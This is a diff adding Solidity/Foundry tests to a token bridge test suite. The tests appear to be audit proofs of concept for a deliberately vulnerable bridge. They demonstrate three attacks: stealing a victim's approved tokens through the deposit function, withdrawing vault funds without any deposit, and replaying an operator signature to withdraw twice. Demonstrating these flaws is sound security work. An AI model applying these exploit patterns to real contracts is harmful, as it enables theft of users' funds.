@@ -15,7 +15,9 @@ contract L1BossBridgeTest is Test {
 
     address deployer = makeAddr("deployer");
     address user = makeAddr("user");
+    address user2 = makeAddr("user2");
     address userInL2 = makeAddr("userInL2");
+    address user2InL2 = makeAddr("user2InL2");
     Account operator = makeAccount("operator");
 
     L1Token token;
@@ -28,6 +30,7 @@ contract L1BossBridgeTest is Test {
         // Deploy token and transfer the user some initial balance
         token = new L1Token();
         token.transfer(address(user), 1000e18);
+        token.transfer(address(user2), 1000e18);
 
         // Deploy bridge
         tokenBridge = new L1BossBridge(IERC20(token));
@@ -142,6 +145,40 @@ contract L1BossBridgeTest is Test {
         vm.stopPrank();
     }
 
+    function testUserCanStealTokens() public {
+        vm.startPrank(user);
+        // The victim approve 10e18 tokens to transfer
+        // But move only a part at the moment
+        uint256 amountToApprove = 10e18;
+        uint256 amountToSend = 2e18;
+        uint256 amountToSteal = 5e18;
+        token.approve(address(tokenBridge), amountToApprove);
+
+        // Initial balance of the victim: 1000000000000000000000
+        console2.log(token.balanceOf(address(user)));
+
+        // The victim deposit 2e18
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, userInL2, amountToSend);
+        tokenBridge.depositTokensToL2(user, userInL2, amountToSend);
+
+        // The balance of the victim after his deposit: 998000000000000000000
+        console2.log(token.balanceOf(address(user)));
+
+        // The attacker steals 5e18 to the victim
+        vm.startPrank(user2);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, user2InL2, amountToSteal);
+        tokenBridge.depositTokensToL2(user, user2InL2, amountToSteal);
+
+        // The balance of the victim after the attack: 993000000000000000000
+        console2.log(token.balanceOf(address(user)));
+
+        assertEq(token.balanceOf(address(tokenBridge)), 0);
+        assertEq(token.balanceOf(address(vault)), amountToSend + amountToSteal);
+        vm.stopPrank();
+    }
+
     function testUserCannotDepositBeyondLimit() public {
         vm.startPrank(user);
         uint256 amount = tokenBridge.DEPOSIT_LIMIT() + 1;
@@ -176,6 +213,81 @@ contract L1BossBridgeTest is Test {
         tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
 
         assertEq(token.balanceOf(address(user)), userInitialBalance);
+        assertEq(token.balanceOf(address(vault)), 0);
+    }
+
+    function testAttackerCanStealTokensWithWithdrawFunction() public {
+        // A user deposit tokens on the vault
+        vm.startPrank(user);
+        uint256 depositAmount = 10e18;
+        uint256 userInitialBalance = token.balanceOf(address(user));
+        uint256 user2InitialBalance = token.balanceOf(address(user2));
+        token.approve(address(tokenBridge), depositAmount);
+        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
+
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+        assertEq(
+            token.balanceOf(address(user)),
+            userInitialBalance - depositAmount
+        );
+
+        // User2 steal tokens from the vault without any previous deposit
+        vm.startPrank(user2);
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
+            _getTokenWithdrawalMessage(user2, depositAmount),
+            operator.key
+        );
+        tokenBridge.withdrawTokensToL1(user2, depositAmount, v, r, s);
+        assertEq(
+            token.balanceOf(address(user2)),
+            user2InitialBalance + depositAmount
+        );
+        assertEq(token.balanceOf(address(vault)), 0);
+    }
+
+    function testUserCanWithdrawTokensTwiceWithOperatorSignature() public {
+        vm.startPrank(user);
+        uint256 depositAmount = 10e18;
+        uint256 userInitialBalance = token.balanceOf(address(user));
+        uint256 user2InitialBalance = token.balanceOf(address(user2));
+
+        // User deposit 10e18 tokens
+        token.approve(address(tokenBridge), depositAmount);
+        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
+
+        // User2 deposit 10e18 tokens
+        vm.startPrank(user2);
+        token.approve(address(tokenBridge), depositAmount);
+        tokenBridge.depositTokensToL2(user2, user2InL2, depositAmount);
+
+        assertEq(token.balanceOf(address(vault)), depositAmount * 2);
+        assertEq(
+            token.balanceOf(address(user)),
+            userInitialBalance - depositAmount
+        );
+        assertEq(
+            token.balanceOf(address(user2)),
+            user2InitialBalance - depositAmount
+        );
+
+        // Create a signature
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
+            _getTokenWithdrawalMessage(user, depositAmount),
+            operator.key
+        );
+        // Withdraw 10e18 tokens first time with the signature
+        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
+
+        assertEq(token.balanceOf(address(user)), userInitialBalance);
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+
+        // Withdraw 10e18 tokens second time with the same signature
+        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
+
+        assertEq(
+            token.balanceOf(address(user)),
+            userInitialBalance + depositAmount
+        );
         assertEq(token.balanceOf(address(vault)), 0);
     }
 
